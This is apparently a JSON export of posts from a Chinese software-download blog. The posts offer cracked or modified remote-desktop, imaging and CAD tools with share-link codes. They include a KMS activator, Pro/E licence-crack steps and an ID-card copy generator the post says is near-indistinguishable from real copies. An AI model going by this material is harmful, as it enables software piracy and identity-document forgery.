n2dg","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Radmin-老牌远程控制软件","slug":"software-remotetool-radmin","date":"2017-07-12T07:23:48.000Z","updated":"2017-07-12T07:23:48.000Z","comments":true,"path":"software-remotetool-radmin.html","permalink":"https://sobaigu.com/software-remotetool-radmin.html","excerpt":"","text":"基本信息 程序类型：安装绿色特别版 界面语言：中文英文 文件大小： m 支持系统：Windows 官方主页：www.radmin.cn 软件介绍 Radmin 一个快速而安全的远程控制和远程访问软件，通过它，您可以就像坐在远程计算机前一样，在远程计算机上工作，并可以从多个位置访问远程计算机。Radmin 完全支持 Windows 8（32 位和 64 位）、文件传输、多用户文字与语音聊天、Windows 安全、Kerberos 身份验证、所有数据流的 256 位 AES 加密、远程登录访问、多显示器支持和独特的 DirectScreenTransfer™ 技术。Radmin 使用现有的 TCP/IP 协议 — 在 LAN、WAN 和因特网中使用得最广泛的协议。 支持文本和语音聊天 文本聊天、语音聊天和发送消息模式，都是 Radmin version 3 新开发的功能，它们有助于您与所连接的远程电脑上操作的用户进行交流。 使用简单 Radmin 非常易于学习和使用。 我们大多数的客户都认为 Radmin 的主要优点在于简易。 所有的报告界面很直观，而程序也非常易于使用。 不同于那些臃肿软件（bloatware），Radmin 没有无用的“增值”功能使它难以使用，不易学习或拖累它的性能。 安全的“拖放式”文件传输，带有“增量复制”（Delta Copy）功能 使用 Radmin 您可以在资源管理器风格的界面中轻松拖放，对远程电脑上的任何文件以加密方式进行传输。 Radmin 在复制文件的时候有项功能，可以允许仅更新在两台电脑上不同的部分文件。 这项功能称为“增量复制”（Delta Copy）因为只复制文件的差异（“增量”）。 它允许在网络故障之后继续复制操作，从故障发生的地方开始复制而非从头开始。 此功能在从/往远程电脑上复制任何文件时自动使用。 支持多连接 Radmin 支持同时多个连接到同一远程屏幕。 这意味着您可以邀请朋友或同事远程观看您的屏幕（很适合开会），或从您自己的电脑屏幕上查看或控制若干远程屏幕（非常适合远程外包服务或教学）。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6ut5","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"HEU KMS Activator-Windows系统或office激活工具迷你版","slug":"software-system-kms-activator","date":"2017-07-06T07:44:32.000Z","updated":"2017-07-06T07:44:32.000Z","comments":true,"path":"software-system-kms-activator.html","permalink":"https://sobaigu.com/software-system-kms-activator.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：3.2 m 支持系统：Windows 官方主页： 软件介绍 HEU KMS Activator基于MDL论坛的“KMS Server Emulator”，是一款KMS激活工具，为“知彼而知己”原创工具。主要适用于Windows以及Office的VL版本，无需联网即可一键激活。经众多网友的测试使用，此版本激活成功率最高。此外，本工具还可以用于系统封装，带参数可以静默执行激活。 功能简介 用于激活Windows及Office的VL版； 安装或搭建KMS服务器； 检查Windows及Office的激活状态； 安装Windows及Office的KMS密钥； 重置Windows及Office的激活状态。 激活成功率高、执行速度快、支持几乎所有VOL版； 在Win7下无需安装.NET Framework 4.0即可使用； 支持Windows/Office激活信息备份和还原； 可以自行安装或搭建KMS服务器； 三种语言（简/繁/英）自动识别； 带参数可静默运行并且参数可根据需要自行选择； 可以一键自动激活、也可以根据需要自行选择； 包含了很多和KMS相关的功能（安装密钥、激活状态查询等）； 完全可以离线激活，也可以连接网络服务器进行激活； 具有详细的使用教程及其激活原理的介绍，使用上更加安全放心。 简明激活教程 如果激活Windows则点击按钮“激活Windows”，如果激活Office 2010则点击按钮“激活WindowsOffice 2010 VL”，如果激活Office 2013则点击按钮“激活WindowsOffice 2013 VL”，180天后到期，再次执行相同的操作即可。 如果想免去180天执行一次激活的操作，可以点击【高级】里面的按钮“安装自动续期服务”，如果卸载点击“卸载自动续期服务”即可。 如果既安装了Windows又安装了Office，可以分别点击上述按钮来激活，也可以点击按钮“一键激活(ALL)并自动续期”，完成激活并自动安装续期服务。 “自动续期服务”的作用是：保持开机启动，永远维持激活状态，这项是可选操作。 使用公网KMS服务器激活 在【附加】选项中，输入服务器的IP地址； 然后依次点击“第1步”、“第2步”、“第3步”即可。 搭建KMS服务器 在【附加】选项中，使用默认IP地址，点击第1步即可搭建成功 将计算机连接到公网，公网IP作为KMS服务器的地址，其他计算机连接上即可激活。 静默参数 /? 查看具体参数； /s 激活Windows和Office； /i 安装自动续期服务； /u 卸载自动续期服务； 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 a8nv 其他激活工具及方式 Microsoft Office 2003-2016 三 / 四合一 绿色精简版 电话激活密钥_Windows 10_专业版/企业版_MAK密钥及其激活要点说明","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"UltraISO-启动盘制作工具","slug":"software-media-UltraISO","date":"2017-07-02T04:49:53.000Z","updated":"2017-07-02T04:49:53.000Z","comments":true,"path":"software-media-UltraISO.html","permalink":"https://sobaigu.com/software-media-UltraISO.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：1.8 m 支持系统：Windows 官方主页：www.ezbsystems.com 软件介绍 UltraISO软碟通 – 轻轻松松编辑映像文件！UltraISO软碟通 9.0 光盘工具可以快速可靠地制作、管理、查看、编辑和转换您的 CD/DVD 映像文件。 软碟通UltraISO是一款功能强大、方便实用的光盘映像ISO文件编辑制作工具，这款光盘映像文件制作/编辑/转换工具，可直接编辑ISO文件，从ISO中提取文件和目录；也可从CD – ROM制作光盘映像或将硬盘上的文件制作成ISO；还可编辑ISO的启动信息，制作可引导光盘。使用UltraISO，可以随心所欲地制作/编辑/转换光盘映像文件，配合光盘刻录软件烧录出自己所需要的光碟。 关于此绿色特别版及单文件 基于官方红名单版制作，免注册码，集成注册信息，启动即为已授权高级版！ 绿色版：含Lame编码器，资源管理器右键关联模块！绿色原生便携，配置信息不写注册表！ 单文件：无资源管理器右键关联模块，无帮助文档，小巧实用方便携带，便于在PE集成使用！ 注：单文件版默认不加载虚拟光驱驱动。使用时点“工具-加载到虚拟光驱”菜单，“加载-光盘镜像”即可！退出自动“卸载-虚拟光驱”，无需点“虚拟光驱”功能里的-卸载，计算机不会出现虚拟光驱盘符。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 ioiu","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Remote Desktop Organizer-Windows远程桌面管理","slug":"software-remotetool-remote-desktop-organizer","date":"2017-06-30T07:56:08.000Z","updated":"2017-06-30T07:56:08.000Z","comments":true,"path":"software-remotetool-remote-desktop-organizer.html","permalink":"https://sobaigu.com/software-remotetool-remote-desktop-organizer.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小：1.4 m 支持系统：Windows 官方主页：www.appmazing.com/remote-desktop-organizer/ 软件介绍 Remote Desktop Organizer也就是RDO，是一款 Windows 远程桌面管理软件，让你在同一个窗口内浏览到多个远程桌面的信息，方便 Windows 远程管理。 软件界面截图引自nirmaltv.com 或许很少有普通用户同时连接 N 多的远程桌面的需求，Remote Desktop Organizer 就是这样一款帮助你管理大量远程桌面的软件，适合于拥有众多电脑的工作人员。当然如果家里有几台电脑也可以连上玩玩。 Remote Desktop Organizer 可以建立不同的分类，管理远程密码，并且能同时打开远程桌面。 如果服务器远程桌面设置启用了 只允许启用安全认证的连接 时，默认将无法连接，连接的时候右下角也会提示相关错误。 请按如下方法进行设置即可： 在左侧入口连接名称上上右键：Edit》点击Advanced标签 勾选下方的 Enable Credential Security Support Provider (CredSSP) 然后就可通杀要远程的Windows服务器上各种远程桌面设置了。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 y9q3","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"TTVNC-小巧的远程控制软件","slug":"software-remotetool-ttvnc","date":"2017-06-25T07:14:31.000Z","updated":"2017-06-25T07:14:31.000Z","comments":true,"path":"software-remotetool-ttvnc.html","permalink":"https://sobaigu.com/software-remotetool-ttvnc.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：0.7 m 支持系统：Windows 官方主页：www.ttvnc.com 软件介绍 TTVNC能跨过防火墙和路由器的VNC 软件，是个比较易用的远程遥控软件，只需要客户端和主控端验证码相同就可以连接了。 TTVNC的目的是帮助用户远程进行远程电脑维护。该软件通过服务器中转可以跨越NAT网络，让任何能够上网的计算机都能够远程管理，因而使用更加方便。该软件改造自 TightVNC，VNC，RealVNC 等远程终端控制软件，免安装，绿色小巧。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6ut5","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"AnyDesk-免费小巧的远程工具","slug":"software-remotetool-anydesk","date":"2017-06-20T03:32:16.000Z","updated":"2017-06-20T03:32:16.000Z","comments":true,"path":"software-remotetool-anydesk.html","permalink":"https://sobaigu.com/software-remotetool-anydesk.html","excerpt":"","text":"基本信息 程序类型：安装绿色版 界面语言：中文英文 文件大小：1.6 m 支持系统：Windows/Linux/MacOS/Android/iOS 官方主页：https://anydesk.com/remote-desktop 软件介绍 AnyDesk是一款号称速度最快的免费远程连接/远程桌面控制软件，据说是前 TeamViewer 开发小组人员自立门户的产品，它拥有先进的视频压缩技术 DeskRT， 可轻松穿透防火墙/路由器，实测在电信、移动的跨网宽带环境下，速度确实要比 TeamViewer 和 QQ 流畅。 现如今网络环境越来越复杂，防火墙、路由器、宽带提供商等各种因素常常会导致很多「直连」的远程控制软件(如微软的 Remote Desktop) 操作缓慢甚至是连接错误。而 AnyDesk 给人的印象是速度极快、反应流畅迅速，比起前辈 TeamViewer 有过之而无不及，而且它体积还极为小巧。 AnyDesk 为了解决远程桌面连接速度慢的问题，使用了名为 DeskRT 的底层技术，内置了先进的视频解码器，使得在复杂的网络坏境下依然能让用户体验到流畅的远程桌面控制。 AnyDesk 支持声音传输、支持画质设置、屏幕截图，重点还支持与远程电脑同步剪贴板！不仅是文字，即使是文件或文件夹，都能直接复制/粘贴到另一台电脑去，这点非常实用！功能还算比较丰富。 另外，AnyDesk 既可以以绿色软件的方式运行，也可以安装到系统上实现开机启动、无人干预的情况下接受控制等。总的来说，AnyDesk 原生简体中文、原生绿色免费、原生单文件、体积小巧，但功能却很实用，使用也足够简单，整体速度较为流畅，应该可满足很多人远程控制需求。 局域网怎么使用 一般都是用来内网穿墙远程用的，如果想局域网使用也是可以的，需要anydesk地址里直接填局域网ip访问即可。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6ut5","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"2345看图王-功能齐全的看图软件","slug":"software-media-2345picviewer","date":"2017-06-16T09:16:50.000Z","updated":"2017-06-16T09:16:50.000Z","comments":true,"path":"software-media-2345picviewer.html","permalink":"https://sobaigu.com/software-media-2345picviewer.html","excerpt":"","text":"基本信息 程序类型：安装绿色特别版 界面语言：中文英文 文件大小：9.36 m 支持系统：Windows 官方主页：pic.2345.com 软件介绍 2345看图王 – 号称速度最快的看图软件！免费简洁，兼容所有的主流图片格式，采用了全球最快的强劲图片引擎，即使在低配置的电脑上也用飞快打开几十兆的大图，更能支持鼠标翻页操作，看图更方便。 关于去广告版-by 3K (三千院雨） 去图片管理窗口左下角图片广告 去看图程序主窗口下方文字广告 去启动后会弹出的每日新闻窗口 修改软件上下各处的2345的字样 修改文件关联格式名的显示问题 可选是否安装PDF阅读器此功能 可选安装第三方右键菜单看图器 去除软件提示文件损坏的弹出窗 去开始菜单内容中的多余的菜单 去软件校验和自动升级让你慢用 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"LogoDesign-LogoMaker-logo设计软件","slug":"software-media-logo-design","date":"2017-06-12T05:59:11.000Z","updated":"2017-06-29T05:59:11.000Z","comments":true,"path":"software-media-logo-design.html","permalink":"https://sobaigu.com/software-media-logo-design.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文 文件大小：13.3 m 支持系统：Windows 官方主页： 软件介绍 简单直观的Logo设计软件，设计一个Logo只要几分钟。你不必是一个专业的标志设计师就可设计出高品质的公司Logo、企业徽标、网页签名、按钮、图标等。 Logo Design采用全新的logo设计引擎，更好的支持Intel和AMD核心的MMX、3DNOW技术，通过独家多线程运算技术使Logo设计更快。丰富的模板，颜色和款式效果给你设计的可能性无限量的标志。 Logo Design采用独创的缓存技术，设计logo过程中占用少量的内存。同时CPU的占用也降到最低，低配置的电脑上也可流畅使用，logo再复杂也不怕。 Logo Design全新设计的软件界面，给您带来不一样的操作体验！简洁清晰的功能设置，解决传统logo设计软件功能繁杂，操作混乱的弊病，谁都能轻松上手。 Logo Design资源库中存储超过2500精心设计的分类标志图像并支持搜索图像。导入Flash的SWF资源和提取的矢量图形标志使用高分辨率图像是LogoDesign一大特色。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 1vus","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"身份证复印件生成器-双刃剑，用者责任自负！","slug":"software-media-ID-creat","date":"2017-06-09T08:47:55.000Z","updated":"2017-06-09T08:47:55.000Z","comments":true,"path":"software-media-ID-creat.html","permalink":"https://sobaigu.com/software-media-ID-creat.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：25.9 m 支持系统：Windows 官方主页： 软件介绍 身份证复印件生成器是一款身份证复印件制作软件，能自动生成身份证复印件的电脑软件。在网络论坛中，身份证复印件生成器多被用来“恶搞”名人。其中，凤姐和奥巴马的假“身份证”在各大论坛内流传了很久，几乎可以以假乱真。 使用方法 按照要求，填入了本人的姓名、性别、民族、出生年月日、现住址、身份证号码等基本信息，并上传了一张证件照。随后，点击“证件保存”选项，并打印出来。前后不过3分钟，一张十分逼真的“身份证复印件”就出炉了。 效果 生成器生成的“复印件”和真实的身份证复印件相比，基本上可以以假乱真。 注意事项 身份证复印件的分辨率太低，如果不仔细看，根本不可能分辨出真假。虽说身份证复印件是一份附加证明材料，只有和原件一起使用时才有效，但还请使用者自行担负责任。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 4cot","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"证照之星-绿色免费版","slug":"software-media-zzzx","date":"2017-06-06T08:47:55.000Z","updated":"2017-06-06T08:47:55.000Z","comments":true,"path":"software-media-zzzx.html","permalink":"https://sobaigu.com/software-media-zzzx.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：8.5 m 支持系统：Windows 官方主页：www.zhzzx.com 软件介绍 证照之星是证件照片制作软件，具有一键裁剪， 智能背景替换，批量制作、内置证照规格的四大优势。 同时两大独创技术：智能去除皮肤油光、证照服装替换。同时支持联机拍摄：支持网络摄像头及可联机拍摄的相机。 本证件照软件已广泛应用于公安系统、车辆管理所、学校、出入境管理局、外事部等相关部门。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 4cot","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"光影魔术手-去广告绿色版","slug":"software-media-NeoImaging","date":"2017-06-03T08:47:55.000Z","updated":"2017-06-03T08:47:55.000Z","comments":true,"path":"software-media-NeoImaging.html","permalink":"https://sobaigu.com/software-media-NeoImaging.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：13.5 m 支持系统：Windows 官方主页： 软件介绍 光影魔术手简单、易用，每个人都能制作精美相框，艺术照，专业胶片效果，而且完全免费它不需要任何专业的图像技术，就可以制作出专业胶片摄影的色彩效果，是摄影作品后期处理、图片快速美容、数码照片冲印整理时必备的图像处理软件. 此去广告版特点 基于官方版修改 去右下角推荐弹窗、主界面文字广告、去报名照广告 禁当前目录生成tp数据包文件、temp\\XLLiveUD文件 硬改素材模板从当前目录加载，可选注册右键编辑控件 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 4cot","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"SecureCRT+SecureFX-支持多标签的 SSH 客户端","slug":"software-remotetool-SecureCRT","date":"2017-06-01T08:00:30.000Z","updated":"2017-06-16T08:00:30.000Z","comments":true,"path":"software-remotetool-SecureCRT.html","permalink":"https://sobaigu.com/software-remotetool-SecureCRT.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：9.5 m 支持系统：Windows/Linux 官方主页：www.vandyke.com 软件介绍 SecureCRT 和 SecureFX 都是由 VanDyke 出品的 SSH 传输工具。SecureCRT 是一款非常好用的、支持多标签的 SSH 客户端，极大方便了管理多个 SSH 会话。 而 SecureFX 则是一款专业而灵活、支持安全文件传输的 SFTP 客户端，也支持 SCP、SSL 等安全协议、以及传统的 FTP 协议。另外 SecureFX 比 FlashFXP 提供的 SFTP 功能更为全面健壮。 为方便使用，做出 SecureCRT+SecureFX 的整合版，运行 SecureCR 或 SecureFX 后，可以在保持 SSH 对话 Session 的情况下相互调用对方，方便以不同方式管理服务器。 使用说明 已做成绿色便携版，所有的配置保存在 Data 目录中，直接运行 SecureCRTPortable.exe 或 SecureFXPortable.exe 即可。 SecureFX上传中文文件乱码解决方法见此 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6ut5 另外一款优秀的SSH客户端可见：Xshell-Windows平台上优秀的 SSH 客户端","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Xshell-Windows平台上优秀的 SSH 客户端","slug":"software-remotetool-xshell","date":"2017-06-01T08:00:30.000Z","updated":"2017-06-16T08:00:30.000Z","comments":true,"path":"software-remotetool-xshell.html","permalink":"https://sobaigu.com/software-remotetool-xshell.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：3.2 m 支持系统：Windows 官方主页：netsarang.com 软件介绍 Xshell 是一个运行于MS Windows平台上强大的 SSH, TELNET 和 RLOGIN 终端仿真器。用户可以从Windows PC上安全地访问Unix/Linux主机。 像SecureCRT 配合 SecureFX一样，Xshell 也带了个 Xftp，是一个基于 MS windows 平台的功能强大的SFTP、FTP 文件传输软件。 特色功能 Xshell 这款极好用的 SSH 客户端，可以作为 SSH、SFTP、Serial、Telnet、Rlogin 等协议的安全终端模拟软件，同时支持自定义常用命令按钮，配合服务器上安装lrzsz命令上传下载文件，让你轻松管理远程主机。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6ut5 收到臭名卓著的sijie马丁威胁，不再提供下载，请自行其他渠道搜索 参考使用方法 为了小白我也是操碎了心，特意做了个视频教程，自己看吧。如果不清晰就到youku去看 图文教程懒得写，有需要可以去看：Linux远程管理器xshell和xftp使用教程 另外一款优秀的SSH客户端可见：SecureCRT+SecureFX-支持多标签的 SSH 客户端","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Git提交时提示‘The file will have its original line endings in your working directory’","slug":"The-file-will-have-its-original-line-endings-in-your-working-directory","date":"2017-05-31T07:57:31.000Z","updated":"2024-09-28T00:17:21.262Z","comments":true,"path":"The-file-will-have-its-original-line-endings-in-your-working-directory.html","permalink":"https://sobaigu.com/The-file-will-have-its-original-line-endings-in-your-working-directory.html","excerpt":"折腾Hexo博客有一阵子，每次提交的时候直接Hexo d后没管，这次仔细看了提交时的输出日志，发现满屏提示 warning: LF will be replaced by CRLF in xxxxx The file will have its original line endings in your working directory.","text":"折腾Hexo博客有一阵子，每次提交的时候直接Hexo d后没管，这次仔细看了提交时的输出日志，发现满屏提示 warning: LF will be replaced by CRLF in xxxxx The file will have its original line endings in your working directory. 之前一直没在意，趁有空着手解决，原来是Git默认配置替换回车换行成统一的CRLF，我们只需要修改配置禁用该功能即可。 Gitshell中输入如下命令解决： 1git config --global core.autocrlf false 使用git config --list命令查看Git所有配置。 参考链接： Git学习笔记","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"PROE-模具设计制图","slug":"software-media-pore","date":"2017-05-29T05:59:11.000Z","updated":"2017-05-29T05:59:11.000Z","comments":true,"path":"software-media-pore.html","permalink":"https://sobaigu.com/software-media-pore.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文 文件大小：575.3 m 支持系统：Windows 官方主页： 软件介绍 Pro/ENGINEER Wildfire 5.0 最新全功能绿色破解免安装版！！ 已完全破解，全功能绿色版，这个版本修正了网上绿色版无法安装任意盘的错误，修正proe1.psf 这个文件的路径错误。 PTC日前宣布其MCAD/CAM/CAE软件的主要版本proe5.0破解版野火版（PTC一体化产品开发体系的重要部分）隆重上市。Pro/ENGINEER Wildfire野火版蕴涵了丰富的最佳实践，可以帮助用户更快、更轻松地完成工作。该版本是PTC有史以来质量最高的Pro/ENGINEER新版本。为了使中国的用户第一时间体验到新版本的强大功能。 pore是做产品设计最好的软件(模具设计没UG方便)是三维建模的领头羊之一。在中国使用的PROE软件大部分是汉化的，存在很多漏洞、待进一步修复及加强。proe5.0免费版是应用于模具设计、机械设计的大型设计绿色免费软件。proe5.0免费版相对于UG SOLIDWORKS来说，它参数化强大，对于建模来说，proe5.0绿色免费硬盘版不仅有造型，而且导入进来的外来文件，还有补面模块，即使没有具体尺寸，也可以通过拍照进行反求建模。 使用说明 解压到任意盘，用记事本，打开你的X:\\proeWildfire 5.0\\crack\\License.DAT 文件， 找出你的网卡MAC地址，把00-00-00-00-00-00全部替换成你的MAC地址，然后就可以直接运行！！！ PRoE的目录应该是 X:\\proeWildfire 